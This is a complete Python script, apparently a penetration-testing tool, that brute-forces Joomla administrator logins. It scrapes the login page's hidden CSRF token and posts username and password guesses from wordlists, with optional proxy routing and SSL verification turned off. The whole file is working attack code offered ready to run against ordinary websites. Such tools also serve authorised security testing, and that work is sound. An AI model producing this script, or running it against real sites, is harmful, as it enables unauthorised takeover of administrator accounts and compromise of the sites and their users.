#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse
import sys  # Import sys to use sys.stdout.flush()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Joomla():

    def __init__(self):
        self.initializeVariables()
        self.sendrequest()

    def initializeVariables(self):
        parser = argparse.ArgumentParser(description='Joomla login bruteforce tool with proxy support and optional SSL verification disabling.')
        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site URL')
        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')
        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy (e.g., http://127.0.0.1:8080). Optional.')
        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output showing failed attempts.')
        parser.add_argument('-k', '--insecure', action='store_true', help='Disable SSL certificate verification. Use with caution, especially with proxies.')

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str, help='Single username to attempt')
        group.add_argument('-U', '--userlist', type=str, help='Path to file containing list of usernames')

        args = parser.parse_args()

        self.proxies = None
        if args.proxy:
            self.proxies = {'http': args.proxy, 'https': args.proxy}
        self.verbose = args.verbose
        self.verify_ssl = not args.insecure
        self.url = args.url + '/administrator/'
        self.cookies = requests.session().get(self.url, proxies=self.proxies, verify=self.verify_ssl).cookies.get_dict()
        self.wordlistfile = args.wordlist
        self.username = args.username
        self.userlist = args.userlist

    def sendrequest(self):
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username = user.decode('utf-8')
                self.doGET()
        else:
            self.doGET()

    def doGET(self):
        passwords = self.getdata(self.wordlistfile)
        total_passwords = len(passwords)
        current_password_index = 1

        for password in passwords:
            sys.stdout.write(f'\rTrying password {bcolors.OKGREEN}{current_password_index}{bcolors.ENDC} of {total_passwords}: {password.decode("utf-8")}{bcolors.ENDC}\033[K')
            sys.stdout.flush()

            headers = {'User-Agent': 'nano'}
            r = requests.get(self.url, proxies=self.proxies, cookies=self.cookies, headers=headers, verify=self.verify_ssl)

            soup = BeautifulSoup(r.text, 'html.parser')
            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
            password = password.decode('utf-8')

            data = {
                'username': self.username,
                'passwd': password,
                'option': 'com_login',
                'task': 'login',
                'return': 'aW5kZXgucGhw',
                longstring: 1
            }

            r = requests.post(self.url, data=data, proxies=self.proxies, cookies=self.cookies, headers=headers, verify=self.verify_ssl)
            soup = BeautifulSoup(r.text, 'html.parser')
            response = soup.find('div', {'class': 'alert-message'})

            if response and self.verbose:
                print(f'\n{bcolors.FAIL}Failed: {self.username}:{password}{bcolors.ENDC}')
            elif not response:
                print(f'\n\nPassword Found: \n\nUsername:{bcolors.OKGREEN}{self.username}{bcolors.ENDC}\nPassword:{bcolors.OKGREEN}{password}{bcolors.ENDC}')
                break

            current_password_index += 1

    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = [line.rstrip() for line in f]
        return data

joomla = Joomla()
